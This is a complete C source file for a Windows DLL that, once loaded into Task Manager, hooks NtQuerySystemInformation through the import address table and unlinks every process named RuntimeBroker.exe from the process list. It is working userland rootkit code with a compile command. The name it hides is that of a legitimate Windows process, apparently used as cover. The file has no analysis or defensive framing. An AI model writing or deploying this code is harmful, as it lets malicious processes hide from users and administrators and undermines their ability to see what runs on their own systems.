/*
 * hider.dll — Hides RuntimeBroker.exe from Task Manager
 * Technique: IAT hook on NtQuerySystemInformation inside taskmgr.exe
 * Compile: gcc -shared -o hider.dll hider.c -lntdll -O2 -s
 */
#include <windows.h>
#include <winternl.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/* The process name to hide */
static const WCHAR g_target[] = L"RuntimeBroker.exe";
static const int g_target_len = sizeof(g_target) / sizeof(WCHAR) - 1;

/* Original function pointer */
typedef NTSTATUS (WINAPI *pfnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

static pfnNtQuerySystemInformation g_orig = NULL;
static int g_hooked = 0;

/* Case-insensitive wide string compare (only compares n chars) */
static int wcsnicmp_local(const WCHAR *a, const WCHAR *b, int n)
{
    for (int i = 0; i < n; i++) {
        WCHAR ca = (a[i] >= 'A' && a[i] <= 'Z') ? a[i] + 32 : a[i];
        WCHAR cb = (b[i] >= 'A' && b[i] <= 'Z') ? b[i] + 32 : b[i];
        if (ca != cb) return 1;
        if (ca == 0) return 0;
    }
    return 0;
}

/* Check if process name matches our target */
static int is_target(UNICODE_STRING *name)
{
    if (!name || !name->Buffer || name->Length == 0) return 0;
    int chars = name->Length / sizeof(WCHAR);
    if (chars != g_target_len) return 0;
    return wcsnicmp_local(name->Buffer, g_target, g_target_len) == 0;
}

/* Hooked NtQuerySystemInformation — filters out our process */
static NTSTATUS WINAPI hook_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS cls,
    PVOID info,
    ULONG len,
    PULONG ret_len)
{
    NTSTATUS status = g_orig(cls, info, len, ret_len);

    if (cls != SystemProcessInformation || status != STATUS_SUCCESS)
        return status;

    /* Walk the linked list and unlink matching entries */
    SYSTEM_PROCESS_INFORMATION *prev = NULL;
    SYSTEM_PROCESS_INFORMATION *cur = (SYSTEM_PROCESS_INFORMATION *)info;

    while (1) {
        if (is_target(&cur->ImageName)) {
            /* Unlink this entry */
            if (prev) {
                if (cur->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += cur->NextEntryOffset;
            }
            /* Don't update prev — we removed cur */
        } else {
            prev = cur;
        }

        if (cur->NextEntryOffset == 0) break;
        cur = (SYSTEM_PROCESS_INFORMATION *)((BYTE *)cur + cur->NextEntryOffset);
    }

    return status;
}

/* Find and patch the IAT entry for NtQuerySystemInformation */
static int do_hook(void)
{
    HMODULE base = GetModuleHandleA(NULL); /* taskmgr.exe base */
    if (!base) return 0;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (imp_rva == 0) return 0;

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)base + imp_rva);

    /* Find ntdll.dll import */
    while (imp->Characteristics) {
        const char *dll_name = (const char *)((BYTE *)base + imp->Name);
        /* Case-insensitive compare for "ntdll.dll" */
        if ((dll_name[0] == 'n' || dll_name[0] == 'N') &&
            (dll_name[1] == 't' || dll_name[1] == 'T') &&
            (dll_name[2] == 'd' || dll_name[2] == 'D') &&
            (dll_name[3] == 'l' || dll_name[3] == 'L') &&
            (dll_name[4] == 'l' || dll_name[4] == 'L')) {
            break;
        }
        imp++;
    }
    if (!imp->Characteristics) return 0;

    /* Walk the thunk table to find NtQuerySystemInformation */
    IMAGE_THUNK_DATA *orig_thunk = (IMAGE_THUNK_DATA *)((BYTE *)base + imp->OriginalFirstThunk);
    IMAGE_THUNK_DATA *iat_thunk  = (IMAGE_THUNK_DATA *)((BYTE *)base + imp->FirstThunk);

    while (orig_thunk->u1.AddressOfData) {
        if (!(orig_thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
            IMAGE_IMPORT_BY_NAME *name = (IMAGE_IMPORT_BY_NAME *)((BYTE *)base + orig_thunk->u1.AddressOfData);
            /* Compare function name */
            const char *fn = (const char *)name->Name;
            if (fn[0] == 'N' && fn[1] == 't' && fn[2] == 'Q' && fn[3] == 'u' &&
                fn[4] == 'e' && fn[5] == 'r' && fn[6] == 'y' && fn[7] == 'S' &&
                fn[8] == 'y' && fn[9] == 's' && fn[10] == 't' && fn[11] == 'e' &&
                fn[12] == 'm' && fn[13] == 'I' && fn[14] == 'n' && fn[15] == 'f' &&
                fn[16] == 'o') {
                /* Found it — save original and patch */
                g_orig = (pfnNtQuerySystemInformation)iat_thunk->u1.Function;

                DWORD old_prot;
                VirtualProtect(&iat_thunk->u1.Function, sizeof(ULONGLONG), PAGE_READWRITE, &old_prot);
                iat_thunk->u1.Function = (ULONGLONG)hook_NtQuerySystemInformation;
                VirtualProtect(&iat_thunk->u1.Function, sizeof(ULONGLONG), old_prot, &old_prot);

                g_hooked = 1;
                return 1;
            }
        }
        orig_thunk++;
        iat_thunk++;
    }

    return 0;
}

/* Unhook — restore original IAT entry */
static void do_unhook(void)
{
    if (!g_hooked || !g_orig) return;

    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)base + imp_rva);

    while (imp->Characteristics) {
        const char *dll_name = (const char *)((BYTE *)base + imp->Name);
        if ((dll_name[0] == 'n' || dll_name[0] == 'N') &&
            (dll_name[1] == 't' || dll_name[1] == 'T')) {
            IMAGE_THUNK_DATA *orig_thunk = (IMAGE_THUNK_DATA *)((BYTE *)base + imp->OriginalFirstThunk);
            IMAGE_THUNK_DATA *iat_thunk  = (IMAGE_THUNK_DATA *)((BYTE *)base + imp->FirstThunk);
            while (orig_thunk->u1.AddressOfData) {
                if ((ULONGLONG)iat_thunk->u1.Function == (ULONGLONG)hook_NtQuerySystemInformation) {
                    DWORD old_prot;
                    VirtualProtect(&iat_thunk->u1.Function, sizeof(ULONGLONG), PAGE_READWRITE, &old_prot);
                    iat_thunk->u1.Function = (ULONGLONG)g_orig;
                    VirtualProtect(&iat_thunk->u1.Function, sizeof(ULONGLONG), old_prot, &old_prot);
                    g_hooked = 0;
                    return;
                }
                orig_thunk++;
                iat_thunk++;
            }
            break;
        }
        imp++;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        do_hook();
        break;
    case DLL_PROCESS_DETACH:
        do_unhook();
        break;
    }
    return TRUE;
}
